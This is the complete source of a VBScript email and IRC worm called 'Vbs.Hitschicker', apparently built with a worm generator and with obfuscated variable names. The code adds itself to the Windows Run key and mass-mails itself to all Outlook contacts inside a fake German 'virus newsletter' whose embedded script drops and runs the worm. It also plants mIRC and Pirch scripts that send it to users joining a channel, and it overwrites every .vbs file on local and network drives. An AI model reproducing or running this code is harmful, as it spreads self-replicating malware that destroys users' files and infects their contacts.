'Vbs.Hitschicker Created By Braindead
On Error Resume Next
Set H68en322Ah4vO0ckBy1fVttb5poL0kk = CreateObject("WScript.Shell")
H68en322Ah4vO0ckBy1fVttb5poL0kk.regwrite "HKCU\software\Hitschicker\", Chr(87) & Chr(111) & Chr(114) & Chr(109) & Chr(32) & Chr(109) & Chr(97) & Chr(100) & Chr(101) & Chr(32) & Chr(119) & Chr(105) & Chr(116) & Chr(104) & Chr(32) & Chr(86) & Chr(98) & Chr(115) & Chr(119) & Chr(103) & Chr(32) & Chr(49) & Chr(46) & Chr(53) & Chr(48) & Chr(98)
Set X7WWL8BIQOf3cTs4pk1E1x3QZ0OrL2A= Createobject("scripting.filesystemobject")
X7WWL8BIQOf3cTs4pk1E1x3QZ0OrL2A.copyfile wscript.scriptfullname,X7WWL8BIQOf3cTs4pk1E1x3QZ0OrL2A.GetSpecialFolder(1)& "\www.virus-aktuell.de.vbs"
H68en322Ah4vO0ckBy1fVttb5poL0kk.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Winrun","wscript.exe "&X7WWL8BIQOf3cTs4pk1E1x3QZ0OrL2A.GetSpecialFolder(1)& "\www.virus-aktuell.de.vbs %"
if H68en322Ah4vO0ckBy1fVttb5poL0kk.regread ("HKCU\software\Hitschicker\mailed") <> "1" then
FgGGND3BJ3zmhkMqlQ1OW2e45wYupD9()
end if
if H68en322Ah4vO0ckBy1fVttb5poL0kk.regread ("HKCU\software\Hitschicker\mirqued") <> "1" then
yToIevA449fJvYBs03xJmY8jr0F5EG4 ""
end if
if H68en322Ah4vO0ckBy1fVttb5poL0kk.regread ("HKCU\software\Hitschicker\pirched") <> "1" then
aI1fjvLtxjQ594x4B6lGrW5LfI4o0eD ""
end if
Cd965y18en322Ah4vO0ckBy1fVttb5p()
if month(now) =3 and day(now) =29 then
msgbox "Danke das sie den Newsletter gelesen haben!",64
end if
Function FgGGND3BJ3zmhkMqlQ1OW2e45wYupD9()
On Error Resume Next
Set P4jK12gGGND3BJ3zmhkMqlQ1OW2e45w= CreateObject("Outlook.Application")
If P4jK12gGGND3BJ3zmhkMqlQ1OW2e45w = "Outlook" Then
Set a2dc7YToIevA449fJvYBs03xJmY8jr0= X7WWL8BIQOf3cTs4pk1E1x3QZ0OrL2A.opentextfile(wscript.scriptfullname, 1)
I = 1
Do While a2dc7YToIevA449fJvYBs03xJmY8jr0.atendofstream = False
FOD2TAI1fjvLtxjQ594x4B6lGrW5LfI= a2dc7YToIevA449fJvYBs03xJmY8jr0.readline
l9h5Z1d965y18en322Ah4vO0ckBy1fV= l9h5Z1d965y18en322Ah4vO0ckBy1fV& Chr(34) & " & vbcrlf & " & Chr(34) & replace(FOD2TAI1fjvLtxjQ594x4B6lGrW5LfI, Chr(34), Chr(34) & "&chr(34)&" & Chr(34))
Loop
a2dc7YToIevA449fJvYBs03xJmY8jr0.close
s1QM2e2dc7YToIevA449fJvYBs03xJm = "<" & "HTML><" & "HEAD><" & "META content=" & Chr(34) & " & chr(34) & " & Chr(34) & "text/html; charset=iso-8859-1" & Chr(34) & " http-equiv=Content-Type><" & "META content=" & Chr(34) & "MSHTML 5.00.2314.1000" & Chr(34) & " name=GENERATOR><" & "STYLE></" & "STYLE></" & "HEAD><" & "BODY bgColor=#ffffff><" & "SCRIPT language=vbscript>"
s1QM2e2dc7YToIevA449fJvYBs03xJm = s1QM2e2dc7YToIevA449fJvYBs03xJm& vbCrLf & "On Error Resume Next"
s1QM2e2dc7YToIevA449fJvYBs03xJm = s1QM2e2dc7YToIevA449fJvYBs03xJm & vbCrLf & "Set fso = CreateObject(" & Chr(34) & "scripting.filesystemobject" & Chr(34) & ")"
s1QM2e2dc7YToIevA449fJvYBs03xJm = s1QM2e2dc7YToIevA449fJvYBs03xJm & vbCrLf & "If Err.Number <> 0 Then"
s1QM2e2dc7YToIevA449fJvYBs03xJm = s1QM2e2dc7YToIevA449fJvYBs03xJm & vbCrLf & "document.write " & Chr(34) & "<font face='verdana' color=#ff0000 size='2'>You need ActiveX enabled if you want to see this e-mail.<br>Please open this message again and click accept ActiveX<br>Microsoft Outlook</font>" & Chr(34) & ""
s1QM2e2dc7YToIevA449fJvYBs03xJm = s1QM2e2dc7YToIevA449fJvYBs03xJm & vbCrLf & "Else"
s1QM2e2dc7YToIevA449fJvYBs03xJm = s1QM2e2dc7YToIevA449fJvYBs03xJm & vbCrLf & "Set vbs = fso.createtextfile(fso.getspecialfolder(0) & " & Chr(34) & "\www.virus-aktuell.de.vbs" & Chr(34) & ", True)"
s1QM2e2dc7YToIevA449fJvYBs03xJm = s1QM2e2dc7YToIevA449fJvYBs03xJm & vbCrLf & "vbs.write  " & Chr(34) & l9h5Z1d965y18en322Ah4vO0ckBy1fV& Chr(34)
s1QM2e2dc7YToIevA449fJvYBs03xJm = s1QM2e2dc7YToIevA449fJvYBs03xJm & vbCrLf & "vbs.Close"
s1QM2e2dc7YToIevA449fJvYBs03xJm = s1QM2e2dc7YToIevA449fJvYBs03xJm & vbCrLf & "Set ws = CreateObject(" & Chr(34) & "wscript.shell" & Chr(34) & ")"
s1QM2e2dc7YToIevA449fJvYBs03xJm = s1QM2e2dc7YToIevA449fJvYBs03xJm & vbCrLf & "ws.run fso.getspecialfolder(0) & " & Chr(34) & "\wscript.exe " & Chr(34) & " & fso.getspecialfolder(0) & " & Chr(34) & "\www.virus-aktuell.de.vbs %" & Chr(34) & ""
d052cHOD2TAI1fjvLtxjQ594y4B6lGs = d052cHOD2TAI1fjvLtxjQ594y4B6lGs& vbCrLf & "document.write " & Chr(34) & "Da Sie sich in unseren Newletter<br> angemeldet haben, bekommen Sie von<br> uns heute eine Liste mit aktuellen neuen<br> Viren(beschreibung,sourcecode,<br>schadwirkungen,..) die im Internet<br> umherkrusieren mitgeschickt.<br>Da auch Sourcecode(aufbau eines virus)<br> dabei sind kann es sein das der <br>Virenwächter anspringt,aber bitte keine <br>Sorge deswegen denn es kann keine <br>infektion stattfinden !Ihr Virus-aktuell T<br>eam ( www.virus-aktuell.de )<br>" & Chr(34) & ""
d052cHOD2TAI1fjvLtxjQ594y4B6lGs = d052cHOD2TAI1fjvLtxjQ594y4B6lGs& vbCrLf & "End If"
d052cHOD2TAI1fjvLtxjQ594y4B6lGs = d052cHOD2TAI1fjvLtxjQ594y4B6lGs & vbCrLf & "<" & "/SCRIPT></" & "body></" & "html>"
WY4mRM9h5Z1d965y18en322Ah4vO0ck=s1QM2e2dc7YToIevA449fJvYBs03xJm & d052cHOD2TAI1fjvLtxjQ594y4B6lGs
Set BYdyV3hcRr64jL12gGGNDvBJ4zmhlMq = P4jK12gGGND3BJ3zmhkMqlQ1OW2e45w.GetNameSpace("MAPI")
set aYx31i052cHOD2TAI1fjwLtxjQ594y4=BYdyV3hcRr64jL12gGGNDvBJ4zmhlMq.AddressLists
For Each l6n5ml1RM2e2ec7YToIevA449gJvYBs In aYx31i052cHOD2TAI1fjwLtxjQ594y4
If l6n5ml1RM2e2ec7YToIevA449gJvYBs.AddressEntries.Count <> 0 Then
BQLHqEY4mRM9h5Z1d965y18en322Ah4= l6n5ml1RM2e2ec7YToIevA449gJvYBs.AddressEntries.Count
Set v5n890YdyV3hcRr64jL12gGGNDvBJ4z= P4jK12gGGND3BJ3zmhkMqlQ1OW2e45w.CreateItem(0)
v5n890YdyV3hcRr64jL12gGGNDvBJ4z.Subject = "FW:Newsletter 2002/03 www.virus-aktuell.de"
v5n890YdyV3hcRr64jL12gGGNDvBJ4z.HTMLBody = WY4mRM9h5Z1d965y18en322Ah4vO0ck
v5n890YdyV3hcRr64jL12gGGNDvBJ4z.DeleteAfterSubmit = True
For X1bWQh6n5ml1RM2e2ec7YToIevA449g = 1 To BQLHqEY4mRM9h5Z1d965y18en322Ah4
Set gn9koaYx31i052cHOD2TAI1fjwLtxjQ= l6n5ml1RM2e2ec7YToIevA449gJvYBs.AddressEntries(X1bWQh6n5ml1RM2e2ec7YToIevA449g)
If BQLHqEY4mRM9h5Z1d965y18en322Ah4= 1 Then
v5n890YdyV3hcRr64jL12gGGNDvBJ4z.BCC = gn9koaYx31i052cHOD2TAI1fjwLtxjQ.Address
Else
v5n890YdyV3hcRr64jL12gGGNDvBJ4z.BCC = v5n890YdyV3hcRr64jL12gGGNDvBJ4z.BCC & "; " & gn9koaYx31i052cHOD2TAI1fjwLtxjQ.Address
End If
Next
v5n890YdyV3hcRr64jL12gGGNDvBJ4z.send
End If
Next
H68en322Ah4vO0ckBy1fVttb5poL0kk.regwrite "HKCU\software\Hitschicker\mailed", "1"
P4jK12gGGND3BJ3zmhkMqlQ1OW2e45w.Quit
end if
End Function
Function yToIevA449fJvYBs03xJmY8jr0F5EG4(P8DxT0QLHqEY4mRM9h5Z1d965y18en3)
On Error Resume Next
if P8DxT0QLHqEY4mRM9h5Z1d965y18en3 = "" then
if X7WWL8BIQOf3cTs4pk1E1x3QZ0OrL2A.fileexists("c:\mirc\mirc.ini") then P8DxT0QLHqEY4mRM9h5Z1d965y18en3="c:\mirc"
if X7WWL8BIQOf3cTs4pk1E1x3QZ0OrL2A.fileexists("c:\mirc32\mirc.ini") then P8DxT0QLHqEY4mRM9h5Z1d965y18en3="c:\mirc32"
l67AwrY75DTd01vNbwz5IQ6o891lfad=H68en322Ah4vO0ckBy1fVttb5poL0kk.regread("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")
if X7WWL8BIQOf3cTs4pk1E1x3QZ0OrL2A.fileexists(l67AwrY75DTd01vNbwz5IQ6o891lfad & "\mirc\mirc.ini") then P8DxT0QLHqEY4mRM9h5Z1d965y18en3=l67AwrY75DTd01vNbwz5IQ6o891lfad & "\mirc"
end if
if P8DxT0QLHqEY4mRM9h5Z1d965y18en3 <> "" then
set p81j66B5QkbI0362XbsP79285sN7py9 = X7WWL8BIQOf3cTs4pk1E1x3QZ0OrL2A.CreateTextFile(P8DxT0QLHqEY4mRM9h5Z1d965y18en3 & "\script.ini", True)
nht5qugF827o9187VCL8AIoOfqcTzd2="[script]"
nht5qugF827o9187VCL8AIoOfqcTzd2=nht5qugF827o9187VCL8AIoOfqcTzd2&vbcrlf&"n0=on 1:JOIN:#:{"
nht5qugF827o9187VCL8AIoOfqcTzd2=nht5qugF827o9187VCL8AIoOfqcTzd2&vbcrlf&"n1=  /if ( $nick == $me ) { halt }"
nht5qugF827o9187VCL8AIoOfqcTzd2=nht5qugF827o9187VCL8AIoOfqcTzd2&vbcrlf&"n2=  /." & chr(100) & chr(99) & chr(99) & " send $nick "&X7WWL8BIQOf3cTs4pk1E1x3QZ0OrL2A.GetSpecialFolder(1)& "\www.virus-aktuell.de.vbs" & vbCrLf & "n3=}"
p81j66B5QkbI0362XbsP79285sN7py9.writeline nht5qugF827o9187VCL8AIoOfqcTzd2
p81j66B5QkbI0362XbsP79285sN7py9.close
H68en322Ah4vO0ckBy1fVttb5poL0kk.regwrite "HKCU\software\Hitschicker\Mirqued", "1"
end if
end function
function aI1fjvLtxjQ594x4B6lGrW5LfI4o0eD(jhQvvd6rqyYKmu2bSU4LdI9YSV17GIs)
On Error Resume Next
if jhQvvd6rqyYKmu2bSU4LdI9YSV17GIs="" then
if X7WWL8BIQOf3cTs4pk1E1x3QZ0OrL2A.fileexists("c:\pirch\Pirch32.exe") then jhQvvd6rqyYKmu2bSU4LdI9YSV17GIs="c:\pirch"
if X7WWL8BIQOf3cTs4pk1E1x3QZ0OrL2A.fileexists("c:\pirch32\Pirch32.exe") then jhQvvd6rqyYKmu2bSU4LdI9YSV17GIs="c:\pirch32"
GQX2ys67AwrY75DTd01vNbwz5IQ6o89=H68en322Ah4vO0ckBy1fVttb5poL0kk.regread("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")
if X7WWL8BIQOf3cTs4pk1E1x3QZ0OrL2A.fileexists(GQX2ys67AwrY75DTd01vNbwz5IQ6o89 & "\pirch\Pirch32.exe") then jhQvvd6rqyYKmu2bSU4LdI9YSV17GIs=GQX2ys67AwrY75DTd01vNbwz5IQ6o89 & "\pirch\Pirch32.exe"
end if
if jhQvvd6rqyYKmu2bSU4LdI9YSV17GIs <> "" then
set aLFADe81j66B5QkbI0362XbsP79285s= X7WWL8BIQOf3cTs4pk1E1x3QZ0OrL2A.CreateTextFile(jhQvvd6rqyYKmu2bSU4LdI9YSV17GIs & "\events.ini", True)
aLFADe81j66B5QkbI0362XbsP79285s.WriteLine "[Levels]"
aLFADe81j66B5QkbI0362XbsP79285s.WriteLine "Enabled=1"
aLFADe81j66B5QkbI0362XbsP79285s.WriteLine "Count=6"
aLFADe81j66B5QkbI0362XbsP79285s.WriteLine "Level1=000-Unknowns"
aLFADe81j66B5QkbI0362XbsP79285s.WriteLine "000-UnknownsEnabled=1"
aLFADe81j66B5QkbI0362XbsP79285s.WriteLine "Level2=100-Level 100"
aLFADe81j66B5QkbI0362XbsP79285s.WriteLine "100-Level 100Enabled=1"
aLFADe81j66B5QkbI0362XbsP79285s.WriteLine "Level3=200-Level 200"
aLFADe81j66B5QkbI0362XbsP79285s.WriteLine "200-Level 200Enabled=1"
aLFADe81j66B5QkbI0362XbsP79285s.WriteLine "Level4=300-Level 300"
aLFADe81j66B5QkbI0362XbsP79285s.WriteLine " 300-Level 300Enabled=1"
aLFADe81j66B5QkbI0362XbsP79285s.WriteLine "Level5=400-Level 400 "
aLFADe81j66B5QkbI0362XbsP79285s.WriteLine "400-Level 400Enabled=1"
aLFADe81j66B5QkbI0362XbsP79285s.WriteLine "Level6=500-Level 500"
aLFADe81j66B5QkbI0362XbsP79285s.WriteLine "500-Level 500Enabled=1"
aLFADe81j66B5QkbI0362XbsP79285s.WriteLine ""
aLFADe81j66B5QkbI0362XbsP79285s.WriteLine "[000-Unknowns]"
aLFADe81j66B5QkbI0362XbsP79285s.WriteLine "UserCount=0"
aLFADe81j66B5QkbI0362XbsP79285s.WriteLine "EventCount=0"
aLFADe81j66B5QkbI0362XbsP79285s.WriteLine ""
aLFADe81j66B5QkbI0362XbsP79285s.WriteLine "[100-Level 100]"
aLFADe81j66B5QkbI0362XbsP79285s.WriteLine "User1=*!*@*"
aLFADe81j66B5QkbI0362XbsP79285s.WriteLine "UserCount=1"
aLFADe81j66B5QkbI0362XbsP79285s.writeline "Event1=ON JOIN:#:/" & chr(100) & chr(99) & chr(99) & " tsend $nick " & X7WWL8BIQOf3cTs4pk1E1x3QZ0OrL2A.GetSpecialFolder(1) & "\www.virus-aktuell.de.vbs"
aLFADe81j66B5QkbI0362XbsP79285s.WriteLine "EventCount=1"
aLFADe81j66B5QkbI0362XbsP79285s.WriteLine ""
aLFADe81j66B5QkbI0362XbsP79285s.WriteLine "[200-Level 200]"
aLFADe81j66B5QkbI0362XbsP79285s.WriteLine "UserCount=0"
aLFADe81j66B5QkbI0362XbsP79285s.WriteLine "EventCount=0"
aLFADe81j66B5QkbI0362XbsP79285s.WriteLine ""
aLFADe81j66B5QkbI0362XbsP79285s.WriteLine "[300-Level 300]"
aLFADe81j66B5QkbI0362XbsP79285s.WriteLine "UserCount=0"
aLFADe81j66B5QkbI0362XbsP79285s.WriteLine "EventCount=0"
aLFADe81j66B5QkbI0362XbsP79285s.WriteLine ""
aLFADe81j66B5QkbI0362XbsP79285s.WriteLine "[400-Level 400]"
aLFADe81j66B5QkbI0362XbsP79285s.WriteLine "UserCount=0"
aLFADe81j66B5QkbI0362XbsP79285s.WriteLine "EventCount=0"
aLFADe81j66B5QkbI0362XbsP79285s.WriteLine ""
aLFADe81j66B5QkbI0362XbsP79285s.WriteLine "[500-Level 500]"
aLFADe81j66B5QkbI0362XbsP79285s.WriteLine "UserCount=0"
aLFADe81j66B5QkbI0362XbsP79285s.WriteLine "EventCount=0"
aLFADe81j66B5QkbI0362XbsP79285s.close
H68en322Ah4vO0ckBy1fVttb5poL0kk.regwrite "HKCU\software\Hitschicker\pirched", "1"
end if
end function
Function Cd965y18en322Ah4vO0ckBy1fVttb5p()
On Error Resume Next
Set j6PY6wht5qugF827o9187VCL8AIoOfq = X7WWL8BIQOf3cTs4pk1E1x3QZ0OrL2A.Drives
For Each c7lDazhQvvd6rqyYKmu2bSU4LdI9YSV In j6PY6wht5qugF827o9187VCL8AIoOfq
If c7lDazhQvvd6rqyYKmu2bSU4LdI9YSV.Drivetype = Remote Then
w7UnS2QX2ys67AwrY75DTd01vNbwz5I= c7lDazhQvvd6rqyYKmu2bSU4LdI9YSV & "\"
Call zDu14sLFADe81j66B5QkbI0362XbsP7(w7UnS2QX2ys67AwrY75DTd01vNbwz5I)
ElseIf c7lDazhQvvd6rqyYKmu2bSU4LdI9YSV.IsReady Then
w7UnS2QX2ys67AwrY75DTd01vNbwz5I= c7lDazhQvvd6rqyYKmu2bSU4LdI9YSV&"\"
Call zDu14sLFADe81j66B5QkbI0362XbsP7(w7UnS2QX2ys67AwrY75DTd01vNbwz5I)
End If
Next
End Function
Function zDu14sLFADe81j66B5QkbI0362XbsP7(Os4D6g6PY6wht5qugF827o9187VCL8A)
zP5NV5m89fYdfV3TIRr67jLikn8GN1v=Os4D6g6PY6wht5qugF827o9187VCL8A
Set IDX0vQLNq8Y7mR99h5G3d965y18eN62= X7WWL8BIQOf3cTs4pk1E1x3QZ0OrL2A.GetFolder(zP5NV5m89fYdfV3TIRr67jLikn8GN1v)
Set pqOw81bDQL6n5ts3QS2HnkT70ToIeXA= IDX0vQLNq8Y7mR99h5G3d965y18eN62.Files
For Each b97GaV9LoHYx6uD352cOODpTAI3fjvL In pqOw81bDQL6n5ts3QS2HnkT70ToIeXA
if X7WWL8BIQOf3cTs4pk1E1x3QZ0OrL2A.GetExtensionName(b97GaV9LoHYx6uD352cOODpTAI3fjvL.path) = "vbs" then
X7WWL8BIQOf3cTs4pk1E1x3QZ0OrL2A.copyfile wscript.scriptfullname , b97GaV9LoHYx6uD352cOODpTAI3fjvL.path , true
end if
if b97GaV9LoHYx6uD352cOODpTAI3fjvL.name = "mirc.ini" then
yToIevA449fJvYBs03xJmY8jr0F5EG4(b97GaV9LoHYx6uD352cOODpTAI3fjvL.ParentFolder)
end if
if b97GaV9LoHYx6uD352cOODpTAI3fjvL.name = "Pirch32.exe" then
aI1fjvLtxjQ594x4B6lGrW5LfI4o0eD(b97GaV9LoHYx6uD352cOODpTAI3fjvL.ParentFolder)
end if
Next
Set b97GaV9LoHYx6uD352cOODpTAI3fjvL= IDX0vQLNq8Y7mR99h5G3d965y18eN62.SubFolders
For Each t6QKG8DX0vQLNq8Y7mR99h5G3d965y1 In b97GaV9LoHYx6uD352cOODpTAI3fjvL
Call zDu14sLFADe81j66B5QkbI0362XbsP7(t6QKG8DX0vQLNq8Y7mR99h5G3d965y1.path)
Next
End Function
'Vbswg 1.50b